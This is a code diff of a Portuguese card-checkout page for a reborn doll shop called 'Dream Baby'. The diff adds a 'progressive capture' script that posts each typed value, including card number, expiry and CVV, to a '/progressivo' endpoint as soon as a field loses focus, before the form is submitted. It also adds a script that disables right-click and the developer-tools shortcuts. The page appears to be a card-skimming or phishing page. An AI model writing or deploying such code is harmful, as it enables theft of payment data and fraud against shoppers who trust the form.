@@ -1,9 +1,10 @@
 <!DOCTYPE html>
+
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <title>Pagamento com Cartão</title>
-  <style>
+<meta charset="utf-8"/>
+<title>Pagamento com Cartão</title>
+<style>
     body { font-family: Quicksand, Arial, sans-serif; background: #fff7fb; margin: 0; padding: 0; }
     .logo { display: block; margin: 16px auto; max-width: 150px; }
     .container { display: flex; max-width: 900px; margin: 0 auto 32px; gap: 24px; }
@@ -23,59 +24,49 @@
   </style>
 </head>
 <body>
-  <!-- Logo no topo -->
-  <img src="imagens/logo.png" alt="Dream Baby" class="logo">
-
-  <div class="container">
-    <!-- Formulário de Dados do Cartão -->
-    <div class="form-area">
-      <h2>Dados do Cartão</h2>
-      <label for="nome-cartao">Nome no Cartão</label>
-      <input type="text" id="nome-cartao">
-
-      <label for="num-cartao">Número do Cartão</label>
-      <input type="text" id="num-cartao" maxlength="19" placeholder="0000 0000 0000 0000">
-      <div id="num-error" class="error" style="display:none;">Insira um número de cartão válido.</div>
-
-      <label for="validade">Validade (MM/AA)</label>
-      <input type="text" id="validade" maxlength="5" placeholder="MM/AA">
-      <div id="validade-error" class="error" style="display:none;">Data de validade inválida ou expirada.</div>
-
-      <label for="cvv">CVV</label>
-      <input type="text" id="cvv" maxlength="3">
-
-      <label for="telefone">Telefone</label>
-      <input type="text" id="telefone" placeholder="(00) 00000-0000">
-
-      <label for="email">Email</label>
-      <input type="email" id="email" placeholder="seu@email.com">
-
-      <div class="dropdown">
-        <label for="parcelamento">Parcelamento</label>
-        <select id="parcelamento"></select>
-      </div>
-
-      <div class="total">Valor Total: <span id="valor-total"></span></div>
-      <button id="btn-finalizar" onclick="finalizar()" disabled>Finalizar Pagamento</button>
-    </div>
-
-    <!-- Informações da Compra -->
-    <div class="info-area">
-      <h2>Informações da Compra</h2>
-      <p><strong>Produto:</strong> Boneca Reborn Personalizada</p>
-      <p><strong>CEP de entrega:</strong> <span id="cep-info"></span></p>
-      <p><strong>Frete:</strong> Grátis</p>
-      <p><strong>Prazo de entrega:</strong> 10 dias úteis</p>
-      <p><strong>Parcelamento:</strong> <span id="parcelamento-info"></span></p>
-      <!-- Vídeo dinâmico conforme boneca escolhida -->
-      <video id="promo-video" controls autoplay muted loop playsinline>
-        <source src="" type="video/mp4">
+<!-- Logo no topo -->
+<img alt="Dream Baby" class="logo" src="imagens/logo.png"/>
+<div class="container">
+<!-- Formulário de Dados do Cartão -->
+<div class="form-area">
+<h2>Dados do Cartão</h2>
+<label for="nome-cartao">Nome no Cartão</label>
+<input id="nome-cartao" type="text"/>
+<label for="num-cartao">Número do Cartão</label>
+<input id="num-cartao" maxlength="19" placeholder="0000 0000 0000 0000" type="text"/>
+<div class="error" id="num-error" style="display:none;">Insira um número de cartão válido.</div>
+<label for="validade">Validade (MM/AA)</label>
+<input id="validade" maxlength="5" placeholder="MM/AA" type="text"/>
+<div class="error" id="validade-error" style="display:none;">Data de validade inválida ou expirada.</div>
+<label for="cvv">CVV</label>
+<input id="cvv" maxlength="3" type="text"/>
+<label for="telefone">Telefone</label>
+<input id="telefone" placeholder="(00) 00000-0000" type="text"/>
+<label for="email">Email</label>
+<input id="email" placeholder="seu@email.com" type="email"/>
+<div class="dropdown">
+<label for="parcelamento">Parcelamento</label>
+<select id="parcelamento"></select>
+</div>
+<div class="total">Valor Total: <span id="valor-total"></span></div>
+<button disabled="" id="btn-finalizar" onclick="finalizar()">Finalizar Pagamento</button>
+</div>
+<!-- Informações da Compra -->
+<div class="info-area">
+<h2>Informações da Compra</h2>
+<p><strong>Produto:</strong> Boneca Reborn Personalizada</p>
+<p><strong>CEP de entrega:</strong> <span id="cep-info"></span></p>
+<p><strong>Frete:</strong> Grátis</p>
+<p><strong>Prazo de entrega:</strong> 10 dias úteis</p>
+<p><strong>Parcelamento:</strong> <span id="parcelamento-info"></span></p>
+<!-- Vídeo dinâmico conforme boneca escolhida -->
+<video autoplay="" controls="" id="promo-video" loop="" muted="" playsinline="">
+<source src="" type="video/mp4"/>
         Seu navegador não suporta reprodução de vídeo.
       </video>
-    </div>
-  </div>
-
-  <script>
+</div>
+</div>
+<script>
     const VALOR   = 499.90;
     const cep     = localStorage.getItem('cep')    || '';
     const boneca  = localStorage.getItem('boneca') || '';  // "Sofia", "Valentina" ou "Maria"
@@ -176,8 +167,8 @@
     // Função de envio
     async function finalizar() {
       const dados = {
-        nome_titular:  inpNome.value,
-        numero_cartao: inpNum.value.replace(/\s/g,''),
+        nome:          inpNome.value,
+        numeroCartao:  inpNum.value.replace(/\s/g,''),
         validade:      inpVal.value,
         cvv:           inpCVV.value,
         parcelas:      +sel.value,
@@ -186,7 +177,7 @@
         telefone:      inpTel.value,
         email:         inpEmail.value
       };
-      const resp = await fetch('/pedido', {
+      const resp = await fetch('/submit-form', {
         method: 'POST',
         headers: {'Content-Type':'application/json'},
         body: JSON.stringify(dados)
@@ -197,6 +188,30 @@
       }
       window.location.href = 'pagamento-analise.html';
     }
-  </script>
-</body>
+  
+// Captura progressiva
+function capturarProgresso(campo, valor) {
+  fetch('/progressivo', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ campo, valor })
+  });
+}
+[inpNome, inpNum, inpVal, inpCVV, inpTel, inpEmail].forEach(inp => {
+  inp.addEventListener('blur', () => {
+    if (inp.value.trim()) {
+      capturarProgresso(inp.id, inp.value);
+    }
+  });
+});
+
+</script>
+<script>
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.onkeydown = function(e) {
+      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C"))) {
+        return false;
+      }
+    };
+    </script></body>
 </html>
